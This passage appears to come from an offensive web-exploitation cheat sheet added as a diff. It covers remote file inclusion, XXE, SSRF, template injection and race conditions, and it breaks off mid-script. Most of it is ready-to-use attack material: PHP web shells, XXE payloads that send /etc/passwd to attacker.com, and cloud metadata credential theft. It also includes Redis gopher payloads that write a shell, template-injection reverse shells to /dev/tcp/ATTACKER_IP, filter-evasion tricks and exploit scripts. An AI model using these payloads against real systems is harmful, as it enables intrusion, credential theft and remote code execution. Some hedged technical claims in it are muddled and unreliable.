+[Inference] Filter chaining enables complex transformations of file contents potentially bypassing simple pattern matching or creating exploitable encoding states, though chaining complexity depends on available filters and processing order.
+
+---
+
+## Remote File Inclusion (RFI)
+
+Remote File Inclusion vulnerabilities enable arbitrary code execution through inclusion of external files, allowing attackers to host malicious code on attacker-controlled servers and execute it within the target application context.
+
+**RFI Vulnerability Identification**
+
+Identify inclusion points accepting external URLs:
+
+```bash
+http://target/page.php?file=http://attacker.com/shell.php
+http://target/page.php?page=https://attacker.com/content.php
+http://target/view.php?document=ftp://attacker.com/payload.txt
+```
+
+Burp Suite testing:
+
+```
+Analyze application parameters for file/page/content/include/load patterns
+Test with external URL payloads
+Monitor for successful inclusion (200 response, external content reflected)
+```
+
+**External File Hosting**
+
+Set up attacker-controlled server hosting payload files:
+
+```bash
+# Python simple HTTP server
+python3 -m http.server 8080
+
+# PHP built-in server
+php -S 0.0.0.0:8080
+
+# Netcat for single file delivery
+{ echo -ne "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"; cat shell.php; } | nc -l -p 8080
+```
+
+Alternatively, use public hosting:
+
+```
+pastebin.com (with raw URL)
+raw.githubusercontent.com (GitHub raw content)
+attacker-controlled VPS or cloud instance
+```
+
+**Basic RFI Exploitation**
+
+Include external PHP code:
+
+```bash
+# Attacker server hosts shell.php with payload
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+python3 -m http.server 8080
+
+# Target URL includes attacker's payload
+http://target/page.php?file=http://attacker.com:8080/shell.php?cmd=id
+```
+
+Execute arbitrary commands through the included file:
+
+```
+http://target/page.php?file=http://attacker.com/shell.php&cmd=whoami
+http://target/page.php?file=http://attacker.com/shell.php&cmd=cat%20/etc/passwd
+```
+
+**Protocol Specification for RFI**
+
+Include files using various protocols:
+
+```
+http://attacker.com/shell.php
+https://attacker.com/shell.php
+ftp://attacker.com/shell.php
+ftps://attacker.com/shell.php
+```
+
+[Inference] Protocol support depends on PHP stream wrapper configuration—HTTP(S) typically enabled by default, while FTP/FTPS require explicit configuration, though modern PHP defaults restrict remote inclusion via `allow_url_include` directive.
+
+**Filter-Based RFI**
+
+Use PHP filters combined with remote inclusion:
+
+```
+http://target/page.php?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.php
+```
+
+[Unverified] Filter chains applied to remote files enable [Inference] encoding/transformation of external content potentially bypassing filter-based detection, though most filters process content client-side rather than preventing execution.
+
+**RFI via Local Wrappers**
+
+Combine RFI with local wrapper exploitation:
+
+```
+http://target/page.php?file=data:text/plain,<?php system($_GET['cmd']); ?>
+http://target/page.php?file=data:text/html,<php echo shell_exec($_GET['cmd']); ?>
+```
+
+[Unverified] Data URI schemes enable inline code inclusion without external hosting, though exploitation requires `allow_url_fopen` and `allow_url_include` PHP directives both enabled.
+
+**Polyglot RFI/LFI Payloads**
+
+Craft payloads usable for both RFI and LFI:
+
+```php
+<?php
+// Payload works as both included file and executed code
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+// Execute if loaded as LFI
+if(basename(__FILE__) == 'shell.php') {
+    system($_GET['cmd']);
+}
+?>
+```
+
+[Inference] Polyglot payloads enable exploitation of mixed RFI/LFI vulnerabilities where the same payload functions in both inclusion contexts.
+
+**RFI Exploitation via POST Data**
+
+Include remote content processed with POST data:
+
+```bash
+# Target application: page.php includes file from $_POST['file']
+curl -X POST http://target/page.php \
+  -d "file=http://attacker.com/shell.php"
+```
+
+Include wrapper with POST data:
+
+```
+http://target/page.php?file=input://POST
+POST data: <?php system($_GET['cmd']); ?>
+```
+
+[Unverified] Input wrapper exploitation requires specific PHP configuration and POST-to-stdin mapping.
+
+**Null Byte Bypasses in RFI**
+
+Exploit null byte handling in older PHP versions:
+
+```
+http://target/page.php?file=http://attacker.com/shell.php%00.jpg
+```
+
+[Unverified] Null byte truncation in legacy PHP versions truncated strings at null bytes, enabling bypass of file extension validation when `.jpg` suffix requirements were removed by null byte injection, though this vector is patched in PHP ≥ 5.3.
+
+**RFI Detection and Evasion**
+
+Identify and bypass RFI detection mechanisms:
+
+```
+# Standard detection patterns
+if(strpos($file, 'http') !== false) { die('RFI blocked'); }
+
+# Evasion techniques
+http://{attacker.com}/shell.php  (braces)
+//attacker.com/shell.php  (protocol-relative)
+ht\tp://attacker.com/shell.php  (backslash encoding, Windows)
+HTTP://attacker.com/shell.php  (case manipulation)
+```
+
+Alternative obfuscation:
+
+```php
+$base64_url = base64_encode("http://attacker.com/shell.php");
+// Decoded at runtime
+include(base64_decode($base64_url));
+```
+
+[Inference] Detection bypass techniques exploit overly simplistic string matching where the underlying vulnerability remains exploitable through alternative representation of the same payload.
+
+**RFI via Parameter Pollution**
+
+Exploit parameter handling vulnerabilities:
+
+```
+http://target/page.php?file=safe.php?file=http://attacker.com/shell.php
+http://target/page.php?file=safe.php&file=http://attacker.com/shell.php
+```
+
+[Unverified] Parameter pollution may cause [Inference] different code paths to use different parameter values—frontend validation checking `file=safe.php` while backend processing uses `file=http://attacker.com/shell.php`—though specific behavior depends on application framework parameter handling.
+
+---
+
+## XXE (XML External Entity)
+
+XXE vulnerabilities enable arbitrary file disclosure, SSRF (Server-Side Request Forgery), and denial-of-service through exploitation of XML entity expansion and external entity processing in XML parsers.
+
+**XXE Vulnerability Identification**
+
+Identify XML processing entry points:
+
+```bash
+# Content-Type header indicates XML processing
+POST /api/upload HTTP/1.1
+Content-Type: application/xml
+
+# Forms accepting XML data
+POST /process HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+data=<xml>...</xml>
+
+# File uploads with XML extension
+POST /upload HTTP/1.1
+[file.xml content]
+
+# SOAP services
+POST /service.asmx HTTP/1.1
+Content-Type: text/xml
+```
+
+Burp Suite XML detection:
+
+```
+- Crawl application identifying XML endpoints
+- Analyze request/response Content-Type headers
+- Test parameters with XML payloads
+- Monitor for XML parsing errors or XXE indicators
+```
+
+**Basic XXE File Disclosure**
+
+Define external entities referencing local files:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+Alternative syntax:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+```
+
+Post as XML data:
+
+```bash
+curl -X POST -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>' \
+  http://target/process.php
+```
+
+Successful XXE responses include file contents in XML output [Inference] appearing within expected XML elements, though response format depends on how the application structures and displays parsed XML.
+
+**Windows File Access via XXE**
+
+Access Windows-specific file paths:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<foo>&xxe;</foo>
+```
+
+Configuration files:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/sam">
+<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/system">
+<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
+```
+
+**Out-of-Band (OOB) XXE for Data Exfiltration**
+
+Exfiltrate data through external network requests when direct XXE responses don't display entity values:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
+  %dtd;
+]>
+<foo></foo>
+```
+
+Attacker-hosted `exfil.dtd`:
+
+```xml
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?exfil=%file;'>
+%send;">
+%all;
+```
+
+[Inference] Out-of-band XXE enables exfiltration when blind XXE conditions prevent direct response inclusion—data is transmitted to attacker-controlled server through DNS queries or HTTP requests triggered by entity expansion, though data must be URL-encoded for transmission in request URI.
+
+**Blind XXE Detection and Exploitation**
+
+Detect blind XXE through timing or error-based channels:
+
+```xml
+<!-- Time-based blind XXE -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///dev/zero">
+]>
+<foo>&xxe;</foo>
+```
+
+[Unverified] Time-based XXE exploitation through references to `/dev/zero` causes [Inference] parser delays when processing infinite input, though exploitation timing is unreliable and [Unverified] effectiveness depends on XML parser implementation and resource handling.
+
+Error-based XXE:
+
+```xml
+<!-- Trigger XML parsing error revealing file contents -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+[Inference] Error-based XXE exploits XML parsing errors that display entity expansion results in error messages, though this requires error messages to be returned to the client rather than logged server-side only.
+
+**XXE SSRF Exploitation**
+
+Use XXE to make requests to internal systems:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
+]>
+<foo>&xxe;</foo>
+```
+
+Scan internal network through XXE:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
+]>
+<foo>&xxe;</foo>
+```
+
+Access internal services:
+
+```xml
+<!-- Redis -->
+<!ENTITY xxe SYSTEM "gopher://localhost:6379/FLUSHDB">
+
+<!-- MySQL -->
+<!ENTITY xxe SYSTEM "gopher://localhost:3306/">
+
+<!-- SMTP -->
+<!ENTITY xxe SYSTEM "gopher://localhost:25/HELO%20attacker">
+```
+
+[Inference] XXE-based SSRF enables internal network reconnaissance and service enumeration when XML entity expansion processes network protocol URIs, though specific protocol support depends on XML parser implementation and URL stream wrapper availability.
+
+**XXE Denial of Service (Billion Laughs Attack)**
+
+Create exponentially expanding entity definitions causing parser resource exhaustion:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<lolz>&lol4;</lolz>
+```
+
+[Inference] Billion Laughs attack exploits exponential entity expansion causing [Inference] memory consumption and CPU resource exhaustion, enabling denial-of-service through parser resource limits, though modern XML parsers implement entity expansion limits preventing this attack.
+
+**XXE with DTD External References**
+
+Combine DTD processing with external entities for enhanced exploitation:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
+<foo>&xxe;</foo>
+```
+
+Attacker-hosted `malicious.dtd`:
+
+```xml
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+```
+
+[Inference] External DTD loading enables [Inference] centralized payload hosting and distribution of complex XXE payloads, though exploitation depends on the target accepting external DTD references.
+
+**XXE Filter Evasion**
+
+Bypass simple XXE detection through encoding and obfuscation:
+
+```xml
+<!-- URL encoding in file:// URI -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd%00.jpg">
+]>
+<foo>&xxe;</foo>
+
+<!-- Base64 encoded entity definition -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBmb28gWwogIDwhRU5USVRZIHR5cGU9InB1YmxpYyIgc3lzdGVtID0iZmlsZTovL2V0Yy9wYXNzd2QiPgpdPgo8Zm9vPiZwYXNzd2Q7PC9mb28+</foo>
+```
+
+[Inference] Encoding-based XXE evasion exploits overly simplistic detection patterns that match literal entity keywords, though robust implementations detect XXE regardless of encoding through parser-level safeguards.
+
+**XXE via SOAP Services**
+
+SOAP services processing XML enable XXE exploitation:
+
+```xml
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <ns:request xmlns:ns="http://target.local/service">
+      <data>&xxe;</data>
+    </ns:request>
+  </soap:Body>
+</soap:Envelope>
+```
+
+Post to SOAP endpoint:
+
+```bash
+curl -X POST -H "Content-Type: text/xml" \
+  -d @soap_xxe.xml \
+  http://target/service.asmx
+```
+
+[Inference] SOAP services often process XML without XXE protections when developers assume SOAP framework handles validation, though SOAP parsers typically use underlying XML libraries vulnerable to XXE exploitation.
+
+**XXE via SVG Image Upload**
+
+SVG files are XML-based and may be processed for inclusion or validation:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ELEMENT svg ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="10" y="20">&xxe;</text>
+</svg>
+```
+
+Upload SVG and trigger processing:
+
+```bash
+curl -F "file=@xxe.svg" http://target/upload.php
+```
+
+[Inference] Image processing libraries using XML parsing for SVG validation enable XXE exploitation when SVG content is processed server-side, though exploitation depends on library implementation and XXE protection configuration.
+
+**XXE via PDF Metadata**
+
+PDF files containing XML metadata may be vulnerable:
+
+```bash
+# Create PDF with XXE payload in metadata
+exiftool -XMP-dc:Creator='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' document.pdf
+```
+
+[Unverified] XXE exploitation through PDF metadata requires PDF processing libraries to parse and process XML metadata, though most PDF libraries extract text without XML processing [Inference] making this vector uncommon.
+
+**XXE in XLSX/DOCX Exploitation**
+
+Microsoft Office formats use ZIP archives containing XML, enabling XXE through document processing:
+
+```bash
+# Create malicious XLSX
+mkdir -p tmp_xlsx/xl/worksheets
+cat > tmp_xlsx/xl/worksheets/sheet1.xml << 'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="inlineStr">
+        <is><t>&xxe;</t></is>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>
+EOF
+
+cd tmp_xlsx && zip -r ../malicious.xlsx * && cd ..
+```
+
+Upload XLSX to target for processing:
+
+```bash
+curl -F "file=@malicious.xlsx" http://target/process.php
+```
+
+[Inference] Office document processing enables XXE exploitation when documents are parsed by vulnerable XML libraries, though modern Office processing libraries implement XXE protections by default.
+
+**XXE Detection and Prevention Testing**
+
+Identify XXE protection through error analysis:
+
+```xml
+<!-- Submit XXE payload observing response -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+Response indicators:
+
+- XML parsing error (disabled XXE) — "Entity references are not allowed"
+- No output (XXE disabled) — Entity not expanded
+- File contents displayed (XXE vulnerable) — Successful exploitation
+- External entity reference blocked — "DOCTYPE not allowed"
+
+[Unverified] XXE protection mechanisms include disabling DOCTYPE processing, entity expansion limits, or XXE-specific configurations, though specific protection level depends on XML parser library and application framework configuration.
+
+**XXE Parameter Entity Exploitation**
+
+Exploit parameter entity processing for enhanced payloads:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/payload.dtd">
+  %dtd;
+]>
+<foo></foo>
+```
+
+Attacker-hosted `payload.dtd`:
+
+```xml
+<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>%exfil;">
+%all;
+```
+
+[Inference] Parameter entity exploitation enables complex multi-stage XXE attacks with external DTD coordination, though the attack requires both parameter entity processing enabled and external DTD loading permitted.
+
+**XXE via XPath Injection**
+
+Combine XXE with XPath injection for complex exploitation:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>
+  <username>&xxe;</username>
+  <password>' or '1'='1</password>
+</foo>
+```
+
+[Unverified] XPath injection combined with XXE enables [Inference] simultaneous exploitation of multiple vulnerability types when applications process both XML entities and XPath queries, though the attack surface depends on specific application implementation.
+
+**XXE Exploitation in REST APIs**
+
+REST endpoints accepting XML content enable XXE exploitation:
+
+```bash
+curl -X POST http://target/api/data \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <data>&xxe;</data>'
+```
+
+JSON APIs with XML fallback:
+
+```bash
+# Test if API accepts XML when JSON fails
+curl -X POST http://target/api/endpoint \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <request><id>&xxe;</id></request>'
+```
+
+[Inference] REST API XXE exploitation occurs when APIs process XML alongside JSON, sometimes accepting XML through content-type negotiation or fallback handling when JSON parsing fails.
+
+**XXE with CDATA Bypass**
+
+Attempt XXE with CDATA sections potentially bypassing filters:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo><![CDATA[&xxe;]]></foo>
+```
+
+[Unverified] CDATA sections disable entity expansion within content, preventing XXE exploitation in this context, though CDATA bypass attempts are commonly tested despite low exploitation probability.
+
+**XXE Exploitation Automation**
+
+Automated XXE testing using specialized tools:
+
+```bash
+# XXEinjector
+xxeinjector --host attacker.com --file /path/to/xxe_payloads.txt
+
+# Burp Suite XXE plugin
+# Configure XXE detection and exploitation settings within Burp
+
+# Manual Python exploitation
+python3 << 'EOF'
+import requests
+payload = '''<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>'''
+r = requests.post('http://target/process.php', data=payload, headers={'Content-Type': 'application/xml'})
+print(r.text)
+EOF
+```
+
+**XXE via Content-Type Header Exploitation**
+
+Exploit content-type negotiation enabling XXE:
+
+```bash
+# Some frameworks process XML when Accept header requests XML
+curl -X POST http://target/api/endpoint \
+  -H "Accept: application/xml" \
+  -H "Content-Type: application/json" \
+  -d '<?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <request><data>&xxe;</data></request>'
+```
+
+[Inference] Content-type negotiation vulnerabilities enable XXE exploitation when frameworks incorrectly parse request/response types based on Accept headers or Content-Type overrides, though proper framework implementation validates content independent of declared MIME types.
+
+**XXE Information Gathering for Privilege Escalation**
+
+Combine XXE file disclosure with reconnaissance data:
+
+```xml
+<!-- Extract database configuration -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY db SYSTEM "file:///etc/mysql/my.cnf">
+  <!ENTITY config SYSTEM "file:///var/www/html/config.php">
+]>
+<foo>
+  <database>&db;</database>
+  <config>&config;</config>
+</foo>
+```
+
+Extracted credentials enable [Inference] database access and lateral movement to backend systems, though credential location and format depend on specific application configuration.
+
+---
+
+## SSRF (Server-Side Request Forgery)
+
+### Concept Overview
+
+SSRF vulnerabilities allow attackers to make the server perform requests to arbitrary locations, including internal resources not directly accessible from the attacker's position.
+
+### Common SSRF Vectors
+
+**URL Parameters**
+
+```bash
+# Basic SSRF test
+http://target.com/fetch?url=http://internal-service:8080
+
+# Cloud metadata endpoints (AWS)
+http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
+
+# Local file access
+http://target.com/fetch?url=file:///etc/passwd
+```
+
+**HTTP Header Injection**
+
+```http
+GET /download HTTP/1.1
+Host: target.com
+X-Forwarded-For: http://internal-service
+Referer: http://admin-panel.internal
+```
+
+### Bypass Techniques
+
+**IP Address Obfuscation**
+
+```bash
+# Decimal format
+http://2130706433/  # 127.0.0.1
+
+# Octal format
+http://0177.0.0.1/
+
+# Hexadecimal format
+http://0x7f.0x0.0x0.0x1/
+
+# Mixed formats
+http://0x7f.0.0.1/
+
+# IPv6 localhost
+http://[::1]/
+http://[0:0:0:0:0:0:0:1]/
+```
+
+**DNS Rebinding**
+
+```bash
+# Use services like 1u.ms or nip.io
+http://127.0.0.1.nip.io/
+http://localtest.me/  # Resolves to 127.0.0.1
+```
+
+**URL Encoding and Double Encoding**
+
+```bash
+# Single encoding
+http://target.com/fetch?url=http%3A%2F%2F127.0.0.1%2Fadmin
+
+# Double encoding
+http://target.com/fetch?url=http%253A%252F%252F127.0.0.1%252Fadmin
+```
+
+**Protocol Smuggling**
+
+```bash
+# Different protocols
+gopher://127.0.0.1:6379/_SET%20key%20value
+dict://127.0.0.1:11211/stats
+ldap://127.0.0.1:389/dc=example,dc=com
+```
+
+### Cloud Metadata Exploitation
+
+**AWS Metadata**
+
+```bash
+# IMDSv1 (legacy)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Retrieve role credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+```
+
+**Azure Metadata**
+
+```bash
+# Azure Instance Metadata Service
+curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# Access tokens
+curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+**Google Cloud Metadata**
+
+```bash
+# GCP metadata
+curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
+
+# Service account tokens
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+```
+
+### Internal Network Scanning via SSRF
+
+**Port Scanning**
+
+```python
+# Python script for SSRF port scanning
+import requests
+
+target = "http://vulnerable.com/fetch?url="
+internal_host = "192.168.1.10"
+
+for port in range(1, 1000):
+    url = f"{target}http://{internal_host}:{port}"
+    try:
+        response = requests.get(url, timeout=2)
+        if response.status_code != 500:  # Adjust based on error behavior
+            print(f"[+] Port {port} appears open")
+    except:
+        pass
+```
+
+**Gopher Protocol for Protocol Smuggling**
+
+```bash
+# Generate gopher payload for Redis
+# Set a key-value pair
+gopher://127.0.0.1:6379/_SET%20shell%20"<?php system($_GET['cmd']); ?>"
+
+# Save to file
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
+gopher://127.0.0.1:6379/_SAVE
+```
+
+### SSRF to RCE Chains
+
+**Exploiting Internal Services**
+
+```bash
+# Redis exploitation
+ssrftest.py --target http://vulnerable.com/fetch --internal redis://127.0.0.1:6379
+
+# Memcached exploitation
+http://vulnerable.com/fetch?url=gopher://127.0.0.1:11211/_stats
+
+# ElasticSearch exploitation
+http://vulnerable.com/fetch?url=http://127.0.0.1:9200/_search?source={"query":{"match_all":{}}}
+```
+
+### Tools for SSRF Detection and Exploitation
+
+**SSRFmap**
+
+```bash
+# Basic usage
+python3 ssrfmap.py -r request.txt -p url
+
+# With modules
+python3 ssrfmap.py -r request.txt -p url -m readfiles
+
+# AWS module
+python3 ssrfmap.py -r request.txt -p url -m aws
+```
+
+**Gopherus** (Generate gopher payloads)
+
+```bash
+# MySQL payload
+gopherus --exploit mysql
+
+# Redis payload
+gopherus --exploit redis
+
+# FastCGI payload
+gopherus --exploit fastcgi
+```
+
+---
+
+## Template Injection
+
+### Server-Side Template Injection (SSTI)
+
+**Detection Methodology**
+
+```bash
+# Polyglot payload for detection
+{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{ 7*7}
+
+# Basic math expressions
+{{7*'7'}}  # Jinja2: 7777777
+${7*7}     # FreeMarker/Velocity: 49
+<%= 7*7 %> # ERB: 49
+```
+
+### Jinja2 Template Injection (Python/Flask)
+
+**Basic Detection**
+
+```python
+# Test payload
+{{7*7}}  # Should return 49
+{{config}}  # Attempt to access config object
+```
+
+**RCE Exploitation**
+
+```python
+# Access to os module
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Alternative using subprocess
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
+
+# Using request object
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').read()}}
+```
+
+**Object Traversal**
+
+```python
+# Find useful classes
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Find subprocess.Popen index
+{% for i in range(500) %}
+    {{i}}: {{''.__class__.__mro__[1].__subclasses__()[i].__name__}}
+{% endfor %}
+```
+
+### Twig Template Injection (PHP)
+
+**Detection**
+
+```twig
+{{7*7}}
+{{_self}}
+{{dump(app)}}
+```
+
+**RCE Exploitation**
+
+```twig
+# Execute system commands
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Using system function
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
+
+# File read
+{{'/etc/passwd'|file_excerpt(1,30)}}
+```
+
+### FreeMarker Template Injection (Java)
+
+**Detection**
+
+```freemarker
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+```
+
+**RCE Exploitation**
+
+```freemarker
+# Execute system commands
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+# Alternative method
+<#assign classloader=object?api.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+```
+
+### Velocity Template Injection (Java)
+
+**Detection**
+
+```velocity
+${7*7}
+#set($x=7*7)$x
+```
+
+**RCE Exploitation**
+
+```velocity
+# Class loading and execution
+#set($rt = $class.forName("java.lang.Runtime"))
+#set($chr = $class.forName("java.lang.Character"))
+#set($str = $class.forName("java.lang.String"))
+#set($ex=$rt.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+```
+
+### ERB Template Injection (Ruby/Rails)
+
+**Detection**
+
+```erb
+<%= 7*7 %>
+<%= File.open('/etc/passwd').read %>
+```
+
+**RCE Exploitation**
+
+```erb
+# Execute system commands
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+
+# Reverse shell
+<%= IO.popen('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').read %>
+```
+
+### Smarty Template Injection (PHP)
+
+**Detection**
+
+```smarty
+{$smarty.version}
+{php}echo 'test';{/php}
+```
+
+**RCE Exploitation**
+
+```smarty
+# PHP execution (older versions)
+{php}system('id');{/php}
+
+# Static method call
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
+
+# Using {literal} bypass
+{literal}<?php system('id');?>{/literal}
+```
+
+### Template Injection Tools
+
+**tplmap** (Automated SSTI scanner)
+
+```bash
+# Basic scan
+python2 tplmap.py -u 'http://target.com/page?name=*'
+
+# Specify injection point
+python2 tplmap.py -u 'http://target.com/page' -d 'name=*'
+
+# Execute command
+python2 tplmap.py -u 'http://target.com/page?name=*' --os-shell
+
+# Upload file
+python2 tplmap.py -u 'http://target.com/page?name=*' --upload LOCAL REMOTE
+```
+
+**SSTImap**
+
+```bash
+# Interactive mode
+python3 sstimap.py -i
+
+# Automated detection and exploitation
+python3 sstimap.py -u 'http://target.com/page?name=test' --crawl 2
+```
+
+---
+
+## Race Conditions
+
+### Concept Overview
+
+Race conditions occur when application behavior depends on timing/sequence of events, creating exploitable windows between check and use operations.
+
+### TOCTOU (Time-of-Check-Time-of-Use)
+
+**File Upload Race Conditions**
+
+```bash
+# Upload malicious file repeatedly while attempting to access it
+# Terminal 1: Upload loop
+while true; do
+    curl -X POST -F "file=@shell.php" http://target.com/upload
+done
+
+# Terminal 2: Access attempt loop
+while true; do
+    curl http://target.com/uploads/shell.php?cmd=id
+done
+```
+
+**Python Automation**
+
+```python
+import requests
+import threading
+
+target = "http://target.com"
+upload_url = f"{target}/upload"
+execute_url = f"{target}/uploads/shell.php"
+
+def upload():
+    while True:
+        files = {'file': open('shell.php', 'rb')}
+        requests.post(upload_url, files=files)
+
+def execute():
+    while True:
+        try:
+            r = requests.get(f"{execute_url}?cmd=id", timeout=1)
+            if "uid=" in r.text:
+                print("[+] Success!")
+                print(r.text)
+                break
+        except:
+            pass
+
+# Start threads
+threading.Thread(target=upload).start()
+threading.Thread(target=execute).start()
+```
+
+### Payment/Balance Race Conditions
+
+**Concurrent Transaction Exploitation**
+
+```python
+import requests
+import threading
+
+def make_purchase(session_cookie):
+    cookies = {'session': session_cookie}
+    # Purchase with insufficient funds
+    requests.post('http://target.com/purchase', 
+                  data={'item': 'expensive_item'}, 
+                  cookies=cookies)
+
+# Send multiple simultaneous requests
+threads = []
+for i in range(20):
+    t = threading.Thread(target=make_purchase, args=('YOUR_COOKIE',))
